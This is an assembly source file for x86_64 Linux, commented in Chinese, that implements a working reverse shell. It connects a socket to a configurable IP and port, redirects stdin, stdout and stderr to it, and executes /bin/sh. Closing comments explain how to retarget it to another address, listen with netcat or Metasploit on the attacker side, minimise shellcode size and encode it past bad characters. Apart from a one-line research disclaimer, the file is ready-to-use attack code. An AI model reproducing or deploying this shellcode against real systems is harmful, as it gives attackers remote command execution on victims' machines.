; ============================================================
; reverse_shell.asm —— 反向 Shell (Linux x86_64)
;
; 功能：连接到指定 IP:Port 并返回一个交互式 shell
; 编译：nasm -f elf64 reverse_shell.asm -o reverse_shell.o
;
; 注意：本代码仅用于安全研究与学习目的
; ============================================================

section .text
    global _start

_start:
    ; ============================================================
    ; 反向 Shell 步骤：
    ; 1. 创建 socket (sys_socket)
    ; 2. 连接到远程地址 (sys_connect)
    ; 3. 复制文件描述符 (dup2: stdin, stdout, stderr)
    ; 4. 执行 /bin/sh (sys_execve)
    ; ============================================================

    ; ---------- 1. 创建 socket ----------
    ; int socket(int domain, int type, int protocol)
    ; domain = AF_INET = 2
    ; type = SOCK_STREAM = 1
    ; protocol = 0 (IPPROTO_IP)
    ; sys_socket 编号：41

    xor     rax, rax
    mov     al, 41                      ; sys_socket
    xor     rdi, rdi
    mov     dil, 2                      ; AF_INET
    xor     rsi, rsi
    mov     sil, 1                      ; SOCK_STREAM
    xor     rdx, rdx                    ; protocol = 0
    syscall

    mov     r8, rax                     ; 保存 sockfd

    ; ---------- 2. connect 连接 ----------
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    ; struct sockaddr_in {
    ;   short sin_family;   // 2 bytes
    ;   unsigned short sin_port;  // 2 bytes
    ;   struct in_addr sin_addr;  // 4 bytes
    ;   char sin_zero[8];  // 8 bytes
    ; };
    ;
    ; 连接 127.0.0.1:4444
    ; IP 127.0.0.1 = 0x7F000001
    ; Port 4444 = 0x115C (网络字节序 = 0x5C11)

    push    0x0100007F                  ; sin_addr = 127.0.0.1 (小端序)
    mov     word [rsp + 2], 0x5C11      ; sin_port = 4444 (网络字节序)
    mov     byte [rsp], 2               ; sin_family = AF_INET
    ; 现在栈上就是 sockaddr_in 结构

    mov     al, 42                      ; sys_connect
    mov     rdi, r8                     ; sockfd
    mov     rsi, rsp                    ; addr
    xor     rdx, rdx
    mov     dl, 16                      ; addrlen = 16
    syscall

    ; 如果 connect 失败则退出
    cmp     rax, 0
    jl      exit_fail

    ; ---------- 3. dup2 复制文件描述符 ----------
    ; int dup2(int oldfd, int newfd)
    ; 将 stdin(0), stdout(1), stderr(2) 都重定向到 socket
    ; sys_dup2 编号：33

    xor     rcx, rcx
    mov     cl, 3                       ; 循环 3 次 (0, 1, 2)

dup2_loop:
    xor     rax, rax
    mov     al, 33                      ; sys_dup2
    mov     rdi, r8                     ; oldfd = sockfd
    dec     rcx                         ; newfd = 2, 1, 0
    mov     rsi, rcx
    syscall

    test    rcx, rcx
    jnz     dup2_loop

    ; ---------- 4. execve /bin/sh ----------
    ; execve("/bin/sh", NULL, NULL)

    xor     rax, rax
    push    rax                         ; 字符串结尾 NULL
    mov     rbx, 0x68732F6E69622F2F     ; "//bin/sh"
    push    rbx
    mov     rdi, rsp                    ; path = "/bin/sh"
    xor     rsi, rsi                    ; argv = NULL
    xor     rdx, rdx                    ; envp = NULL
    mov     al, 59                      ; sys_execve
    syscall

exit_fail:
    ; 退出
    xor     rdi, rdi
    mov     al, 60
    syscall

; ============================================================
; 配置说明：
;
; 修改 IP 和 Port：
;
; 1. 修改 IP 地址（127.0.0.1 -> 192.168.1.100）
;    192.168.1.100 = 0xC0A80164
;    小端序: 0x6401A8C0
;    将 push 0x0100007F 改为 push 0x6401A8C0
;
; 2. 修改端口（4444 -> 9001）
;    9001 = 0x2329
;    网络字节序(大端): 0x2923
;    将 0x5C11 改为 0x2923
;
; 监听端（攻击机）：
;    nc -lvnp 4444
;    或
;    msfconsole -> use exploit/multi/handler
;
; Shellcode 大小优化技巧：
;
; 1. 使用 8 位寄存器减少 NULL 字节
;    mov al, 59  比 mov rax, 59 少很多字节
;
; 2. 使用 xor 清零
;    xor rax, rax 比 mov rax, 0 短
;
; 3. 复用寄存器
;    尽量使用已有的寄存器值
;
; 4. 字符串压栈
;    用 push 代替数据段，减少段依赖
;
; 壳编码 (Shellcode Encoding)：
;
; 当 shellcode 包含坏字符（如 \x00, \x0a, \x0d）时，
; 需要编码后再使用。常见编码方式：
;   - XOR 编码
;   - ADD/SUB 编码
;   - 字母数字编码 (alphanumeric)
;   - Unicode 编码
;
; 详细编码示例见 custom_encoder.asm
; ============================================================
